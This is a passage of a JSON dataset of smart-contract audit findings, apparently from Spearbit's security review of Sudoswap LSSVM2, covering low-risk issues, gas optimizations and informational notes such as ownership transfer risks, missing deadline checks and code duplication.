        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In transferOwnership(), if newOwner has zero code.length (i.e. EOA), newOwner.isContract() will be false and therefore, if block will be ignored. As the function is payable, any msg.value from the call would get locked in the contract. Note: ERC20 pairs and StandardSettings don't have a method to recover ETH.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use of transferFrom may lead to NFTs getting locked forever",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "ERC721 NFTs may get locked forever if the recipient is not aware of ERC721 for some reason. While safeTransferFrom() is used for ERC1155 NFTs (which has the _doSafeTransferAcceptanceCheck check on recipient and does not have an option to avoid this), transferFrom() is used for ERC721 NFTs presumably for gas savings and reentrancy concerns over its safeTransferFrom variant (which has the _checkOnERC721Received check on the recipient).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step ownership change introduces risks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Single-step ownership transfers add the risk of setting an unwanted owner by accident (this includes address(0)) if the ownership transfer is not done with excessive care. The ownership control library Owned by Solmate implements a simple single-step ownership transfer without zero-address checks.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getAllPairsForSettings() may run out of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function getAllPairsForSettings() has a loop over pairsForSettings. As the creation of pairs is permissionless, that array could get arbitrarily large. Once the array is large enough, the function will run out of gas. Note: the function is only called from the outside. function getAllPairsForSettings(address settings) external view returns (address[] memory) { uint256 numPairs = pairsForSettings[settings].length(); ... for (uint256 i; i < numPairs;) { ... unchecked { ++i; } } ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Partially implemented SellOrderWithPartialFill functionality may cause unexpected behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "pair.spotPrice() == order.expectedSpotPrice in a swap. This may be confusing to users who expect partial fills in both directions but notice unexpected behavior if deployed as-is. While the BuyOrderWithPartialFill functionality is fully implemented, the corresponding SellOrderWithPartialFill feature is partially implemented with getNFTQuoteForSellOrderWithPartialFill, an incomplete _findMaxFillableAmtForSell (placeholder comment: \"// TODO: implement\") and other supporting logic required in swap().",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Lack of deadline checks for certain swap functions allows greater exposure to volatile market prices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Many swap functions in LSSVMRouter use the checkDeadline modifier to prevent swaps from execut- ing beyond a certain user-specified deadline. This is presumably to reduce exposure to volatile market prices on top of the thresholds of maxCost for buys and minOutput for sells. However two router functions robustSwapETH- ForSpecificNFTsAndNFTsToToken and robustSwapERC20ForSpecificNFTsAndNFTsToToken in LSSVMRouter and all functions in VeryFastRouter are missing this modifier and the user parameter required for it. Users attempting to swap using these two swap functions do not have a way to specify a deadline for their execution unlike the other swap functions in this router. If the front-end does not highlight or warn about this, then the user swaps may get executed after a long time depending on the tip included in the transaction and the network congestion. This causes greater exposure for the swaps to volatile market prices.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing function to deposit ERC1155 NFTs after pair creation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions depositNFTs() and depositERC20() are apparently used to deposit ERC721 NFTs and ERC20s into appropriate pairs after their creation. According to the project team, this is used \"for various UIs to consolidate approvals + emit a canonical event for deposits.\" However, an equivalent function for depositing ERC1155 NFTs is missing. This prevents ERC1155 NFTs from being deposited into pairs after creation for scenarios anticipated similar to ERC721 NFTs and ERC20 tokens.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Reading from state is more gas expensive than using msg.sender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Solmate's Owned.sol contract implements the concept of ownership (by saving during contract con- struction the deployer in the owner state variable) and owner-exclusive functions via the onlyOwner() modifier. Therefore, within functions protected by the onlyOwner() modifier, the addresses stored in msg.sender and owner will be equal. So, if a function of said characteristics has to make use of the address of the owner, it is cheaper to use msg.sender than owner, because the latter reads from the contract state (using SLOAD opcode) while the former doesn't (address is directly retrieved via the cheaper CALLER opcode). Reading from state (SLOAD opcode which costs either 100 or 2100 gas units) costs more gas than using the msg.sender environmental variable (CALLER opcode which costs 2 units of gas). Note: withdrawERC20() already uses msg.sender function withdrawETH(uint256 amount) public onlyOwner { payable(owner()).safeTransferETH(amount); ... } function withdrawERC20(ERC20 a, uint256 amount) external override onlyOwner { a.safeTransfer(msg.sender, amount); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "pair.factory().protocolFeeMultiplier() is read from storage on every iteration of the loop wast- ing gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Not caching storage variables that are accessed multiple times within a loop causes waste of gas. If not cached, the solidity compiler will always read the value of protocolFeeMultiplier from storage during each iteration. For a storage variable, this implies extra SLOAD operations (100 additional gas for each iteration beyond the first). In contrast, for a memory variable, it implies extra MLOAD operations (3 additional gas for each iteration beyond the first).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The use of factory in ERC1155._takeNFTsFromSender() can be via a parameter rather than calling factory() again",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "factory is being sent as a parameter to _takeNFTsFromSender in LSSVMPairERC721.sol#L179, which is saving gas because it is not required to read the value again. _takeNFTsFromSender(IERC721(nft()), nftIds, _factory, isRouter, routerCaller); However, in LSSVMPairERC1155.sol#L181, the similar function _takeNFTsFromSender() gets the value by calling factory() instead of using a parameter. _takeNFTsFromSender(IERC1155(nft()), numNFTs[0], isRouter, routerCaller); This creates an unnecessary asymmetry between the two contracts which are expected to be similar and also a possible gas optimization by avoiding a call to the factory getter.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Variables only set at construction time could be made immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "immutable variables can be assigned either at construction time or at declaration time, and only once. The contract creation code generated by the compiler will modify the contracts runtime code before it is returned by replacing all references to immutable variables by the values assigned to the them; so the compiler does not reserve a storage slot for these variables. Declaring variables only set at construction time as immutable results in saving one call per variable to SSTORE (0x55) opcode, thus saving gas during construction.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Hoisting check out of loop will save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The check numIdsFound == maxIdsNeeded will never be true before the outer for loop finishes iterating over maxIdsNeeded because numIdsFound is conditionally incremented only by 1 in each iteration.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Functionality of safeBatchTransferFrom() is not used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function pairTransferERC1155From() allow that transfer of multiple id's of ERC1155 NFTs. The rest of the code only uses one id at a time. Using safeTransferFrom() instead of safeBatchTransferFrom(), might be better as it only accesses one id and uses less gas because no for loop is necessary. However future version of Sudoswap might support multiple ids. In that case its better to leave as is. function pairTransferERC1155From(..., uint256[] calldata ids, uint256[] calldata amounts,...) ... { ... nft.safeBatchTransferFrom(from, to, ids, amounts, bytes(\"\")); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using != 0 instead of > 0 can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "When dealing with unsigned integer types, comparisons with != 0 are 3 gas cheaper than > 0.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using >>1 instead of /2 can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A division by 2 can be calculated by shifting one to the right (>>1). While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Retrieval of ether balance of contract can be gas optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The retrieval of the ether balance of a contract is typically done with address(this).balance. However, by using an assembly block and the selfbalance() instruction, one can get the balance with a discount of 15 units of gas.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function parameters should be validated at the very beginning for gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Function parameters should be validated at the very beginning of the function to allow typical execu- tion paths and revert on the exceptional paths, which will lead to gas savings over validating later.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Loop counters are not gas optimized in some places",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Loop counters are optimized in many parts of the code by using an unchecked {++i} (unchecked + prefix increment). However, this is not done in some places where it is safe to do so.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization MerklePropertyChecker.sol#L22,"
        ]
    },
    {
        "title": "Mixed use of custom errors and revert strings is inconsistent and uses extra gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In some parts of the code, custom errors are declared and later used (CurveErrorCodes and Own- able Errors), while in other parts, classic revert strings are used in require statements. Instead of using error strings, custom errors can be used, which would reduce deployment and runtime costs. Using only custom errors would improve consistency and gas cost. This would also avoid long revert strings which consume extra gas. Each extra memory word of bytes past the original 32 incurs an MSTORE which costs 3 gas. This happens at LSSVMPair.sol#L133, LSSVMPair.sol#L666 and LSSVMPairFactory.sol#L505.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Array length read in each iteration of the loop wastes gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "If not cached, the Solidity compiler will always read the length of the array from storage during each iteration. For storage array, this implies extra SLOAD operations (100 additional gas for each iteration beyond the first). In contrast, for a memory array, it implies extra MLOAD operations (3 additional gas for each iteration beyond the first).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization LSSVMPairERC1155.sol, LSSVMPairETH.sol, LSSVMPairERC721.sol,"
        ]
    },
    {
        "title": "Not tightly packing struct variables consumes extra storage slots and gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Gas efficiency can be achieved by tightly packing structs. Struct variables are stored in 32 bytes each and so you can group smaller types to occupy less storage.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Variables that are redeclared in each loop iteration can be declared once outside the loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "price is redefined in each iteration of the loop and right after declaration is set to a new value. for (uint256 i; i < numNFTs; i++) { uint256 price; (, spotPrice, delta, price,,) = pair.bondingCurve().getBuyInfo(spotPrice, delta, 1, fee, pair.factory().protocolFeeMultiplier()); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Caller of swapTokenForSpecificNFTs() must be able to receive ETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function _refundTokenToSender() sends ETH back to the caller. If this caller is a contract then it might not be able to receive ETH. If it can't receive ETH then the transaction will revert. function _refundTokenToSender(uint256 inputAmount) internal override { // Give excess ETH back to caller if (msg.value > inputAmount) { payable(msg.sender).safeTransferETH(msg.value - inputAmount); } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "order.doPropertyCheck could be replaced by the pair's propertyChecker()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The field+check for a separate order.doPropertyCheck in struct SellOrder is unnecessary be- cause this can already be checked via the pair's propertyChecker() without relying on the user to explicitly specify it in their order.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "_payProtocolFeeFromPair() could be replaced with _sendTokenOutput()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Both ERC20 and ETH versions of _payProtocolFeeFromPair() and _sendTokenOutput() are iden- tical in their parameters and logic.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "False positive in test_getSellInfoWithoutFee() when delta == FixedPointMathLib.WAD due to wrong implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In test_getSellInfoWithoutFee, delta is not validated via validateDelta, which causes a false positive in the current test when delta == FixedPointMathLib.WAD. This can be tried with the following proof of concept // SPDX-License-Identifier: MIT pragma solidity ^0.8.15; import {FixedPointMathLib} from ,! \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/utils/FixedPointMathLib.sol\"; contract test{ using FixedPointMathLib for uint256; constructor() { uint256 delta = FixedPointMathLib.WAD; uint256 invDelta = FixedPointMathLib.WAD.divWadDown(delta); uint outputValue = delta.divWadDown(FixedPointMathLib.WAD - invDelta); // revert } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Checks-Effects-Interactions pattern not used in swapNFTsForToken()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "It is a defensive programming pattern to first take NFTs and then send the tokens (i.e. the Checks- Effects-Interactions pattern). function swapNFTsForToken(...) ... { ... _sendTokenOutput(tokenRecipient, outputAmount); ... _sendTokenOutput(royaltyRecipients[i], royaltyAmounts[i]); ... _payProtocolFeeFromPair(_factory, protocolFee); ... _takeNFTsFromSender(...); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two versions of withdrawERC721() and withdrawERC1155()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "withdrawERC721() and withdrawERC1155() with slightly different implementations. This is more difficult to maintain.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing sanity/threshold checks may cause undesirable behavior and/or waste of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Numerical user inputs and external call returns that are subject to thresholds due to the contract's logic should be checked for sanity to avoid undesirable behavior or reverts in later logic and wasting unnecessary gas in the process.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deviation from standard/uniform naming convention affects readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Following standard/uniform naming conventions are essential to make a codebase easy to read and understand.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational LSSVMPairFactory.sol#L471, LSSVMRouter.sol#L128-L135,"
        ]
    },
    {
        "title": "Function _getRoyaltyAndSpec() contains code duplication which affects maintainability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function _getRoyaltyAndSpec() is rather long and contains code duplication. This makes it difficult to maintain. 45 function _getRoyaltyAndSpec(address tokenAddress, uint256 tokenId, uint256 value) ... if (spec <= NOT_CONFIGURED && spec > NONE) { try IArtBlocksOverride(royaltyAddress).getRoyalties(tokenAddress, tokenId) returns (...) { // Support Art Blocks override require(recipients_.length == bps.length); return (recipients_, _computeAmounts(value, bps), ARTBLOCKS, royaltyAddress, addToCache); } catch {} ... } else { // Spec exists, just execute the appropriate one ... ... if (spec == ARTBLOCKS) { // Art Blocks spec uint256[] memory bps; (recipients, bps) = IArtBlocksOverride(royaltyAddress).getRoyalties(tokenAddress, tokenId); require(recipients.length == bps.length); return (recipients, _computeAmounts(value, bps), spec, royaltyAddress, addToCache); } else ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "getSellInfo always adds 1 rather than rounding which leads to last item being sold at 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Based on the comment // We calculate how many items we can sell into the linear curve until the spot price reaches 0, rounding up. In cases where delta == spotPrice && numItems > 1, the last item would be sold at 0: delta = 100; spotPrice = 100; numItems = 2; uint256 totalPriceDecrease = delta * numItems = 200; Therefore succeeds at: if (spotPrice < totalPriceDecrease) Later calculated: uint256 numItemsTillZeroPrice = spotPrice / delta + 1; That would result in 2, while the division was an exact 1, therefore is not rounded up in case where spotPrice == delta but increased always by 1.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Natspec for robustSwapETHForSpecificNFTs() is slightly misleading",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function robustSwapETHForSpecificNFTs() has this comment: * @dev We assume msg.value >= sum of values in maxCostPerPair This doesn't have to be the case. The transaction just reverts if msg.value isn't sufficient.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two copies of pairTransferERC20From(), pairTransferNFTFrom() and pairTransferERC1155From() are present",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Both contracts LSSVMRouter and VeryFastRouter contain the functions pairTransferERC20From(), pairTransferNFTFrom() and pairTransferERC1155From(). This is more difficult to maintain as both copies have to stay in synch.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Not using error strings in require statements obfuscates monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "require statements should include meaningful error messages to help with monitoring the system.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "prices and balances in the curves may not be updated after calls to depositNFTs() and depositERC20()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions depositNFTs() and depositERC20() allow anyone to add NFTs and/or ERC20 to a pair but do not update the prices and balances in the curves. And if they were to do so, then the functions might be abused to update token prices with irrelevant tokens and NFTs. However, it is not clear if/how the prices and balances in the curves are updated to reflect this. The owner can't fully rely on emits.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions enableSettingsForPair() and disableSettingsForPair() can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions enableSettingsForPair() and disableSettingsForPair() define a temporary vari- able pair. This could also be used earlier in the code to simplify the code. function enableSettingsForPair(address settings, address pairAddress) public { require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); LSSVMPair pair = LSSVMPair(pairAddress); ... } function disableSettingsForPair(address settings, address pairAddress) public { require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); ... LSSVMPair pair = LSSVMPair(pairAddress); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Design asymmetry decreases code readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function _calculateBuyInfoAndUpdatePoolParams() performs a check on maxExpectedToken- Input inside its function. On the other hand, the comparable check for _calculateSellInfoAndUpdatePoolParams() is done outside of the function: function _swapNFTsForToken(...) ... { // LSSVMPairERC721.sol ... (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(...) require(outputAmount >= minExpectedTokenOutput, \"Out too few tokens\"); ... } The asymmetry in the design of these functions affects code readability and may confuse the reader.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Providing the same _nftID multiple times will increase numPairNFTsWithdrawn multiple times to potentially cause confusion",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "If one accidentally (or intentionally) supplies the same id == _nftID multiple times in the array ids[], then numPairNFTsWithdrawn is increased multiple times. Assuming this value is used via indexing for the user interface, this could be misleading.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Dual interface NFTs may cause unexpected behavior if not considered in future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Some NFTs support both the ERC721 and the ERC1155 standard. For example NFTs of the Sandbox project. Additionally, the internal layout of the parameters of cloneETHPair and cloneERC1155ETHPair are very similar: | cloneETHPair | cloneERC1155ETHPair | | --- | --- | | mstore(add(ptr, 0x3e), shl(0x60, factory)) | mstore(add(ptr, 0x3e), shl(0x60, factory)) | | mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) | mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) | | mstore(add(ptr, 0x66), shl(0x60, nft)) | mstore(add(ptr, 0x66), shl(0x60, nft)) | | mstore8(add(ptr, 0x7a), poolType) | mstore8(add(ptr, 0x7a), poolType) | | mstore(add(ptr, 0x7b), shl(0x60, propertyChecker)) | mstore(add(ptr, 0x7b), nftId) | In case there is a specific function that only works on ERC721, and that can be applied to ERC1155 pairs, in combination with an NFT that supports both standards, then an unexpected situation could occur. Currently, this is not the case, but that might occur in future iterations of the code.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing event emission in multicall",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Not emitting events on success/failure of calls within a multicall makes debugging failed multicalls difficult. There are several actions that should always emit events for transparency such as ownership change, transfer of ether/tokens etc. In the case of a multicall function, it is recommended to emit an event for succeeding (or failing) calls.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Returning only one type of fee from getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuote- WithRoyalties() could be misleading",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuoteWithRoyalties() re- turn a protocolFee variable. There are also other fees like tradeFee and royaltyTotal that are not returned from these functions. Given that these functions might be called from the outside, it is not clear why other fees are not included here.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two ways to query the assetRecipient could be confusing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPair has two ways to query the assetRecipient. On via the getter assetRecip- ient() and one via getAssetRecipient(). Both give different results and generally getAssetRecipient() should be used. Having two ways could be confusing. address payable public assetRecipient; function getAssetRecipient() public view returns (address payable _assetRecipient) { ... // logic to determine _assetRecipient }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions expecting NFT deposits can validate parameters for sanity and optimization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions expecting NFT deposits in their typical flows can validate parameters for sanity and opti- mization.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions expecting ETH deposits can check msg.value for sanity and optimization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions that expect ETH deposits in their typical flows can check for non-zero values of msg.value for sanity and optimization.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "LSSVMPairs can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "At the different LSSVMPairs, PairVariant and IMMUTABLE_PARAMS_LENGTH can be passed to LSSVM- Pair, which could store them as immutable. Then functions pairVariant() and _immutableParamsLength() can also be moved to LSSVMPair, which would simplify the code.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused values in catch can be avoided for better readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Employing a catch clause with higher verbosity may reduce readability. Solidity supports different kinds of catch blocks depending on the type of error. However, if the error data is of no interest, one can use a simple catch statement without error data.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Stale constant and comments reduce readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "After some updates, the logic was added ~2 years ago when enum was changed to int16. Based on the comments and given that was upgradeable, it was expected that one could add new unconfigured specs with negative IDs between NONE (by decrementing it) and NOT_CONFIGURED. In this non-upgradeable fork, the current constants treat only the spec ID of 0 as NOT_CONFIGURED. // Anything > NONE and <= NOT_CONFIGURED is considered not configured int16 private constant NONE = -1; int16 private constant NOT_CONFIGURED = 0;",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Different MAX_FEE value and comments in different places is misleading",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The same MAX_FEE constant is declared in different files with different values, while comments indi- cate that these values should be the same. // 50%, must <= 1 - MAX_PROTOCOL_FEE (set in LSSVMPairFactory) uint256 internal constant MAX_FEE = 0.5e18; uint256 internal constant MAX_PROTOCOL_FEE = 0.1e18; // 10%, must <= 1 - MAX_FEE`",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Events without indexed event parameters make it harder/inefficient for off-chain tools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Indexed event fields make them quickly accessible to off-chain tools that parse events. However, note that each indexed field costs extra gas during emission; so it's not necessarily best to index the maximum allowed per event (three fields).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational PropertyCheckerFactory.sol#L11, LSSVMPair.sol#L83,"
        ]
    },
    {
        "title": "Some functions included in LSSVMPair are not found in ILSSVMPair.sol and ILSSVMPairFactory- Like.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
